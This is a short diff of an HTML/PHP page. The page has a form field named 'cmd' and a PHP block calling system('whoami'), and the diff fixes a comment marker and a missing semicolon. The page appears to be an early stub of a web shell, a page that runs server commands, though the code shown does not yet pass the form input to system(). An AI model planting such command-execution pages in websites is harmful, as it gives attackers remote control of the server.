@@ -3,10 +3,10 @@
 		<INPUT TYPE="text" NAME="cmd">
 		<INPUT TYPE="submit" VALUE="Enter">
 	</FORM>
-	<iframe w -->idth="50" height="50" border="0" name="dummyframe" id="dummyframe"></iframe>
+	<iframe width="50" height="50" border="0" name="dummyframe" id="dummyframe"></iframe> -->
 	<pre>
 		<?php
-		system("whoami")
+		system("whoami");
 		?>
 	</pre>
 </BODY></HTML>
